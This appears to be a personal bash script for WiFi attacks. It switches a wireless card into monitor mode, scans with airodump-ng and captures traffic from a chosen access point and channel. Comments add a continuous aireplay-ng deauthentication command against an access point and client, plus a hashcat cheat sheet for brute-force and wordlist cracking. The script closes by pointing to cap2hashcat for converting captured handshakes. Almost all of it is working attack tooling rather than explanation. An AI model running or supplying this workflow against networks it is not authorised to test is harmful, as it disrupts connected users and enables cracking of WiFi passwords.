#!/bin/env bash
set -e

function which_card() {
    ip a
    echo ""
    read -p "which card? " card
}

read -p "drive|dump|end|quit? " answer
case "${answer}" in
drive)
    sudo cp -R ./QCA9377/QCA9377 /lib/firmware/ath10k
    sudo modprobe -r ath10k_pci
    sudo modprobe ath10k_pci
    ;;
dump)
    which_card
    # start
    sudo systemctl stop NetworkManager.service

    sudo ip link set $card down

    sudo iwconfig $card mode Monitor

    # dump
    sudo airodump-ng $card
    
    read -p "bssid? " bssid
    read -p "channel? " channel

    # deauthentication
    # aireplay-ng -0 0 -a 50:C7:BF:DC:4C:E8 -c E0:B5:2D:EA:18:A7 wlan0mon
    # 
    # Command instructions:
    # 
    #     -0 means deauthentication.
    #     0 is the number of deauths to send, 0 means send them continuously, you can send 10 if you want the target to disconnect and reconnect.
    #     -a 50:C7:BF:DC:4C:E8 is the MAC address of the access point we are targeting.
    #     -c E0:B5:2D:EA:18:A7 is the MAC address of the client to deauthenticate; if this is omitted then all clients are deauthenticated.
    #     wlan0mon is the interface name.


    sudo airodump-ng --channel $channel \
	    --bssid $bssid \
	    $card \
	    -w $card-$bssid-$channel

    # hack
    #
    # - [ Basic Examples ] -
    # 
    # Attack-          | Hash- |
    # Mode             | Type  | Example command
    # ==================+=======+==================================================================
    # Wordlist         | $P$   | hashcat -a 0 -m 400 example400.hash example.dict
    # Wordlist + Rules | MD5   | hashcat -a 0 -m 0 example0.hash example.dict -r rules/best64.rule
    # Brute-Force      | MD5   | hashcat -a 3 -m 0 example0.hash ?a?a?a?a?a?a
    # Combinator       | MD5   | hashcat -a 1 -m 0 example0.hash example.dict example.dict
    # Association      | $1$   | hashcat -a 9 -m 500 example500.hash 1word.dict -r rules/best64.rule

    # - [ Built-in Charsets ] -
    # 
    #   ? | Charset
    #  ===+=========
    #   l | abcdefghijklmnopqrstuvwxyz [a-z]
    #   u | ABCDEFGHIJKLMNOPQRSTUVWXYZ [A-Z]
    #   d | 0123456789                 [0-9]
    #   h | 0123456789abcdef           [0-9a-f]
    #   H | 0123456789ABCDEF           [0-9A-F]
    #   s |  !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
    #   a | ?l?u?d?s
    #   b | 0x00 - 0xff
    #
    # hashcat test.txt -a 3 -m 0 --custom-charset1=?l?d ?1?1?1?1?1?1?1?1
    #
    # https://hashcat.net/wiki/doku.php?id=hashcat
    # https://hashcat.net/cap2hashcat/
    
    echo "-> https://hashcat.net/cap2hashcat/"

    ;;
end)
    which_card
    # end
    sudo ip link set $card down

    sudo iwconfig $card mode Managed

    sudo systemctl restart NetworkManager.service
    ;;
*)
    echo "quit"
    ;;
esac
